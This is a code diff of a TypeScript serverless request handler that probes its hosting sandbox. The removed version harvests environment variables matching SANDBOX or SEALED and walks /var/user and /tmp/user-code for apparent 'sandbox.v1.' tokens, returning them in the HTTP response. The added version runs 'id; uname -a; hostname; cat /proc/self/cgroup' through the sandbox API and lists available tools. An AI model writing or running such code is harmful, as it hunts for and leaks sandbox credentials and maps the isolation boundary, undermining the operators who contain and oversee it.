@@ -1,25 +1,9 @@
 export async function onRequest(context: any): Promise<Response> {
-  const env = process.env;
-  const pick = {};
-  for (const k of Object.keys(env)) if (/SANDBOX|SEALED/i.test(k)) pick[k] = env[k];
-  const fs = await import("node:fs");
-  const out: any = { sealEnv: pick, sealEnvEmpty: Object.keys(pick).length === 0 };
-  const scan = (dir, depth) => {
-    if (depth > 6 || out.hits) return;
-    let es = [];
-    try { es = fs.readdirSync(dir, { withFileTypes: true }); } catch { return; }
-    for (const e of es) {
-      if (out.hits) return;
-      const fp = dir + "/" + e.name;
-      let st; try { st = fs.statSync(fp); } catch { continue; }
-      if (st.isDirectory()) { if (!/proc|sys|dev/.test(e.name)) scan(fp, depth + 1); }
-      else if (st.size > 0 && st.size < 30 * 1024 * 1024) {
-        try { const buf = fs.readFileSync(fp); const idx = buf.indexOf('sandbox.v1.');
-          if (idx >= 0) out.hits = { file: fp, ctx: buf.slice(idx - 20, idx + 100).toString('utf8') }; } catch {}
-      }
-    }
-  };
-  try { scan('/var/user', 0); } catch {}
-  if (!out.hits) { try { scan('/tmp/user-code', 0); } catch {} }
+  const out: any = { hasSandbox: !!context.sandbox, ctxKeys: Object.keys(context || {}) };
+  if (context.sandbox) {
+    try { out.info = context.sandbox.getInfo ? context.sandbox.getInfo() : "no-getInfo"; } catch (e: any) { out.infoErr = String(e).slice(0, 250); }
+    try { out.run = await context.sandbox.commands.run("id; uname -a; hostname; cat /proc/self/cgroup | head -3", { timeout: 20 }); } catch (e: any) { out.runErr = String(e).slice(0, 350); }
+    try { out.tools = Object.keys(context.tools || {}); } catch (e: any) {}
+  }
   return new Response(JSON.stringify(out), { headers: { "Content-Type": "application/json" } });
 }
